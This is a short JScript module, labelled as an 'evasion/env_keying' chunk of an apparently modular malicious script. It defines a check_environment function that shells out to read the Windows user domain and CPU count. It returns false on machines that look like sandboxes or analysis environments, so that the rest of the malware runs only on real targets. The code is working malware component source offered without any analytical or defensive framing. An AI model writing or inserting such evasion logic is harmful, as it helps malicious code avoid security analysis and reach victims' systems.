// chunk: evasion/env_keying
// depends: core/run_cmd
// provides: check_environment
// format: jscript

function check_environment() {
    var domain = _run("echo %USERDOMAIN%").replace(/\s/g, "");
    if (domain === "%USERDOMAIN%") return false;
    if (domain.length < 3) return false;
    var cpus = parseInt(_run("echo %NUMBER_OF_PROCESSORS%").replace(/\s/g, ""));
    if (cpus < 2) return false;
    return true;
}
